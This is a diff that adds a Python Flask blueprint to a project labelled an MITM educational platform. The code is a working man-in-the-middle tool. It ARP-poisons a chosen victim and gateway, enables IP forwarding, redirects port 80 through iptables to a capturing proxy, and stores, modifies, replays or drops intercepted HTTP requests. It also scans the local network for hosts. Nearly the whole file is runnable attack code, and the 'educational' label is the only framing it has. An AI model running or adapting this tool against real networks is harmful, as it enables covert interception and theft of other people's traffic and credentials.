@@ -1,0 +1,439 @@
+# SilentSnare – MITM Educational Platform
+# Copyright (c) 2024 SilentSnare Project
+# Licensed under the MIT License. See LICENSE file for details.
+
+import subprocess
+import os
+import time
+import threading
+import re
+import socket
+import socketserver
+from functools import wraps
+from flask import Blueprint, jsonify, render_template, request, current_app
+from database.db import get_db
+
+from scapy.all import ARP, Ether, srp, send, sendp, get_if_hwaddr
+import netifaces
+import ipaddress
+
+bp = Blueprint('scenarios', __name__)
+
+socketio_instance = None
+
+def init_socketio(sio):
+    global socketio_instance
+    socketio_instance = sio
+
+def json_response(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        try:
+            return f(*args, **kwargs)
+        except Exception as e:
+            return jsonify({'success': False, 'error': str(e)}), 500
+    return decorated_function
+
+# ========== متغيرات ARP ==========
+arp_spoof_active = False
+arp_victim_ip = None
+arp_gateway_ip = None
+arp_interface = None
+arp_thread = None
+
+# ========== متغيرات اعتراض HTTP ==========
+http_intercept_active = False
+http_proxy_thread = None
+http_proxy_server = None
+http_proxy_port = 8080
+
+intercepted_requests = []
+intercepted_requests_lock = threading.Lock()
+
+# ========== دوال ARP ==========
+def get_mac(ip, iface):
+    try:
+        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=iface, verbose=0)
+        return ans[0][0][1].hwsrc if ans[0] else None
+    except:
+        return None
+
+def arp_spoof_pair(ip1, ip2, interface, stop_flag):
+    mac1 = get_mac(ip1, interface)
+    mac2 = get_mac(ip2, interface)
+    attacker_mac = get_if_hwaddr(interface)
+    if not mac1 or not mac2:
+        print(f"[ARP] Could not get MAC for {ip1} or {ip2}")
+        return
+    print(f"[ARP] Starting poisoning between {ip1} and {ip2}")
+    counter = 0
+    while not stop_flag():
+        sendp(Ether(src=attacker_mac, dst=mac1)/ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=attacker_mac),
+              iface=interface, verbose=0)
+        sendp(Ether(src=attacker_mac, dst=mac2)/ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=attacker_mac),
+              iface=interface, verbose=0)
+        counter += 1
+        if counter % 5 == 0:
+            print(f"[ARP] Poisoning still active between {ip1} and {ip2}")
+        time.sleep(2)
+
+def restore_arp_pair(ip1, ip2, interface):
+    mac1 = get_mac(ip1, interface)
+    mac2 = get_mac(ip2, interface)
+    if mac1 and mac2:
+        sendp(Ether(dst=mac1)/ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2),
+              iface=interface, count=5, inter=0.2, verbose=0)
+        sendp(Ether(dst=mac2)/ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1),
+              iface=interface, count=5, inter=0.2, verbose=0)
+
+# ========== دوال iptables ==========
+def add_http_redirect():
+    try:
+        cmd = [
+            "sudo", "iptables", "-t", "nat", "-I", "PREROUTING",
+            "-p", "tcp", "--dport", "80",
+            "-j", "REDIRECT", "--to-port", str(http_proxy_port)
+        ]
+        subprocess.run(cmd, check=False)
+        print("[iptables] HTTP redirection added.")
+    except Exception as e:
+        print(f"[iptables] Error adding HTTP redirect: {e}")
+
+def remove_http_redirect():
+    try:
+        cmd = [
+            "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
+            "-p", "tcp", "--dport", "80",
+            "-j", "REDIRECT", "--to-port", str(http_proxy_port)
+        ]
+        subprocess.run(cmd, check=False)
+        print("[iptables] HTTP redirection removed.")
+    except Exception as e:
+        print(f"[iptables] Error removing HTTP redirect: {e}")
+
+# ========== خادم HTTP الوكيل ==========
+class HTTPProxyHandler(socketserver.StreamRequestHandler):
+    def handle(self):
+        global intercepted_requests
+        client_ip = self.client_address[0]
+        print(f"[HTTP Proxy] Connection from {client_ip}")
+
+        self.connection.settimeout(10)
+        request_data = b""
+        try:
+            while True:
+                line = self.rfile.readline()
+                if not line:
+                    break
+                request_data += line
+                if line == b'\r\n' or line == b'\n':
+                    break
+        except socket.timeout:
+            print("[HTTP Proxy] Read timeout")
+            return
+        except Exception as e:
+            print(f"[HTTP Proxy] Read error: {e}")
+            return
+
+        if not request_data:
+            print("[HTTP Proxy] No data received")
+            return
+
+        # تخزين الطلب
+        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+        data_str = request_data.decode('utf-8', errors='ignore')
+        lines = data_str.split('\r\n')
+        first_line = lines[0] if lines else ''
+        parts = first_line.split(' ')
+        method = parts[0] if len(parts) > 0 else '?'
+        path = parts[1] if len(parts) > 1 else '?'
+        host_match = re.search(r'Host:\s*([^\r\n]+)', data_str, re.IGNORECASE)
+        host = host_match.group(1).strip() if host_match else '?'
+
+        req_entry = {
+            'id': int(time.time() * 1000),
+            'timestamp': timestamp,
+            'src_ip': client_ip,
+            'dst_ip': host,
+            'src_port': '',
+            'dst_port': 80,
+            'protocol': 'HTTP (intercepted)',
+            'data': data_str,
+            'is_secure': 0,
+            'method': method,
+            'source': 'intercept'
+        }
+        with intercepted_requests_lock:
+            intercepted_requests.append(req_entry)
+            if len(intercepted_requests) > 100:
+                intercepted_requests.pop(0)
+
+        # إرسال استجابة 200 OK وهمية
+        response = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
+        self.wfile.write(response)
+        print(f"[HTTP Proxy] Request stored, response sent")
+
+class ThreadedHTTPProxyServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
+    allow_reuse_address = True
+
+def start_http_proxy(port):
+    global http_proxy_server, http_proxy_thread
+    http_proxy_server = ThreadedHTTPProxyServer(('0.0.0.0', port), HTTPProxyHandler)
+    http_proxy_thread = threading.Thread(target=http_proxy_server.serve_forever)
+    http_proxy_thread.daemon = True
+    http_proxy_thread.start()
+    print(f"[HTTP Proxy] Started on port {port}")
+
+def stop_http_proxy():
+    global http_proxy_server, http_proxy_thread
+    if http_proxy_server:
+        http_proxy_server.shutdown()
+        http_proxy_server.server_close()
+        http_proxy_server = None
+    http_proxy_thread = None
+
+# ========== نقاط نهاية ARP Spoofing ==========
+@bp.route('/start_arp_spoof', methods=['POST'])
+@json_response
+def start_arp_spoof():
+    global arp_spoof_active, arp_victim_ip, arp_gateway_ip, arp_interface, arp_thread
+    data = request.get_json()
+    victim = data.get('victim_ip')
+    gateway = data.get('gateway_ip')
+    interface = data.get('interface', 'eth0')
+    if not victim or not gateway:
+        return jsonify({'status': 'error', 'message': 'Please enter victim and gateway IP'}), 400
+    if arp_spoof_active:
+        return jsonify({'status': 'error', 'message': 'ARP spoofing already active'}), 400
+    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], check=False)
+    arp_spoof_active = True
+    arp_victim_ip = victim
+    arp_gateway_ip = gateway
+    arp_interface = interface
+    def stop_flag():
+        return not arp_spoof_active
+    arp_thread = threading.Thread(target=arp_spoof_pair, args=(victim, gateway, interface, stop_flag))
+    arp_thread.daemon = True
+    arp_thread.start()
+    return jsonify({'status': 'success', 'message': f'Started ARP spoofing between {victim} and {gateway}'})
+
+@bp.route('/stop_arp_spoof', methods=['POST'])
+@json_response
+def stop_arp_spoof():
+    global arp_spoof_active, arp_victim_ip, arp_gateway_ip, arp_interface, arp_thread
+    if not arp_spoof_active:
+        return jsonify({'status': 'error', 'message': 'No active ARP spoofing'}), 400
+    arp_spoof_active = False
+    if arp_thread and arp_thread.is_alive():
+        arp_thread.join(timeout=3)
+    if arp_victim_ip and arp_gateway_ip and arp_interface:
+        restore_arp_pair(arp_victim_ip, arp_gateway_ip, arp_interface)
+    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=False)
+    arp_victim_ip = arp_gateway_ip = arp_interface = None
+    arp_thread = None
+    return jsonify({'status': 'success', 'message': 'ARP spoofing stopped'})
+
+@bp.route('/arp_status', methods=['GET'])
+@json_response
+def arp_status():
+    if arp_spoof_active:
+        return jsonify({'status': 'active', 'victim': arp_victim_ip, 'gateway': arp_gateway_ip})
+    return jsonify({'status': 'inactive'})
+
+# ========== نقاط نهاية اعتراض HTTP ==========
+@bp.route('/start_http_intercept', methods=['POST'])
+@json_response
+def start_http_intercept():
+    global http_intercept_active
+    if http_intercept_active:
+        return jsonify({'status': 'error', 'message': 'HTTP interception already active'}), 400
+    add_http_redirect()
+    try:
+        start_http_proxy(http_proxy_port)
+    except Exception as e:
+        remove_http_redirect()
+        return jsonify({'status': 'error', 'message': f'Failed to start HTTP proxy: {e}'}), 500
+    http_intercept_active = True
+    return jsonify({'status': 'success', 'message': 'HTTP interception started'})
+
+@bp.route('/stop_http_intercept', methods=['POST'])
+@json_response
+def stop_http_intercept():
+    global http_intercept_active
+    if not http_intercept_active:
+        return jsonify({'status': 'error', 'message': 'HTTP interception not active'}), 400
+    http_intercept_active = False
+    stop_http_proxy()
+    remove_http_redirect()
+    return jsonify({'status': 'success', 'message': 'HTTP interception stopped'})
+
+@bp.route('/http_intercept_status', methods=['GET'])
+@json_response
+def http_intercept_status():
+    return jsonify({'active': http_intercept_active})
+
+@bp.route('/get_http_request', methods=['GET'])
+@json_response
+def get_http_request():
+    with intercepted_requests_lock:
+        if intercepted_requests:
+            return jsonify({'status': 'success', 'request': intercepted_requests[-1]})
+    return jsonify({'status': 'waiting'})
+
+@bp.route('/send_modified_http', methods=['POST'])
+@json_response
+def send_modified_http():
+    data = request.get_json()
+    modified_payload = data.get('payload')
+
+    with intercepted_requests_lock:
+        if not intercepted_requests:
+            return jsonify({'status': 'error', 'message': 'No intercepted request'}), 400
+        req = intercepted_requests[-1]
+        intercepted_requests.pop()
+
+    # استخراج Host والطريقة والمسار
+    data_str = req['data']
+    lines = data_str.split('\r\n')
+    first_line = lines[0] if lines else ''
+    parts = first_line.split(' ')
+    if len(parts) < 2:
+        return jsonify({'status': 'error', 'message': 'Invalid request line'}), 400
+    method = parts[0].upper()
+    path = parts[1]
+    host_match = re.search(r'Host:\s*([^\r\n]+)', data_str, re.IGNORECASE)
+    if not host_match:
+        return jsonify({'status': 'error', 'message': 'Could not extract host header'}), 400
+    host = host_match.group(1).strip()
+    if ':' in host:
+        target_host, target_port = host.split(':')
+        target_port = int(target_port)
+    else:
+        target_host = host
+        target_port = 80
+
+    import socket
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        sock.connect((target_host, target_port))
+        sock.send(modified_payload.encode('utf-8'))
+        response = sock.recv(4096)
+        sock.close()
+        return jsonify({'status': 'success', 'message': f'Modified request sent. Response length: {len(response)}'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@bp.route('/resend_original_http', methods=['POST'])
+@json_response
+def resend_original_http():
+    with intercepted_requests_lock:
+        if not intercepted_requests:
+            return jsonify({'status': 'error', 'message': 'No intercepted request'}), 400
+        req = intercepted_requests[-1]
+        intercepted_requests.pop()
+
+    modified_payload = req['data']
+    # إعادة استخدام منطق الإرسال
+    import socket
+    lines = modified_payload.split('\r\n')
+    first_line = lines[0] if lines else ''
+    parts = first_line.split(' ')
+    if len(parts) < 2:
+        return jsonify({'status': 'error', 'message': 'Invalid request line'}), 400
+    method = parts[0].upper()
+    path = parts[1]
+    host_match = re.search(r'Host:\s*([^\r\n]+)', modified_payload, re.IGNORECASE)
+    if not host_match:
+        return jsonify({'status': 'error', 'message': 'Could not extract host header'}), 400
+    host = host_match.group(1).strip()
+    if ':' in host:
+        target_host, target_port = host.split(':')
+        target_port = int(target_port)
+    else:
+        target_host = host
+        target_port = 80
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        sock.connect((target_host, target_port))
+        sock.send(modified_payload.encode('utf-8'))
+        response = sock.recv(4096)
+        sock.close()
+        return jsonify({'status': 'success', 'message': f'Original request resent. Response length: {len(response)}'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@bp.route('/drop_http', methods=['POST'])
+@json_response
+def drop_http():
+    with intercepted_requests_lock:
+        if intercepted_requests:
+            intercepted_requests.pop()
+            return jsonify({'status': 'success', 'message': 'Request dropped'})
+        else:
+            return jsonify({'status': 'error', 'message': 'No intercepted request'}), 400
+
+@bp.route('/clear_intercepted_requests', methods=['POST'])
+@json_response
+def clear_intercepted_requests():
+    global intercepted_requests
+    with intercepted_requests_lock:
+        intercepted_requests = []
+    return jsonify({'status': 'success', 'message': 'Intercepted requests cleared'})
+
+# ========== نقاط نهاية المسح الشبكي ==========
+@bp.route('/')
+def index():
+    return render_template('scenarios.html')
+
+@bp.route('/scan_network', methods=['POST'])
+@json_response
+def scan_network():
+    data = request.get_json()
+    interface = data.get('interface', 'eth0')
+    try:
+        addrs = netifaces.ifaddresses(interface)
+        ip_info = addrs[netifaces.AF_INET][0]
+        network = ipaddress.IPv4Network(f"{ip_info['addr']}/{ip_info['netmask']}", strict=False)
+        arp_request = ARP(pdst=str(network))
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        answered = srp(broadcast/arp_request, timeout=5, iface=interface, verbose=0)[0]
+        devices = [{'ip': rcv.psrc, 'mac': rcv.hwsrc} for _, rcv in answered]
+        return jsonify({'status': 'success', 'devices': devices})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ========== دالة التنظيف ==========
+def cleanup():
+    global arp_spoof_active, arp_victim_ip, arp_gateway_ip, arp_interface, arp_thread
+    global http_intercept_active
+    global intercepted_requests
+
+    print("🧹 Cleaning up scenario 1 resources...")
+
+    if arp_spoof_active:
+        arp_spoof_active = False
+        if arp_thread and arp_thread.is_alive():
+            arp_thread.join(timeout=3)
+        if arp_victim_ip and arp_gateway_ip and arp_interface:
+            restore_arp_pair(arp_victim_ip, arp_gateway_ip, arp_interface)
+        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=False)
+        arp_victim_ip = arp_gateway_ip = arp_interface = None
+        arp_thread = None
+
+    if http_intercept_active:
+        http_intercept_active = False
+        stop_http_proxy()
+        remove_http_redirect()
+
+    with intercepted_requests_lock:
+        intercepted_requests.clear()
+
+    print("✅ Scenario 1 cleanup done")
+
+# ========== نقطة اختبار ==========
+@bp.route('/test')
+def test():
+    return "✅ Blueprint working correctly"
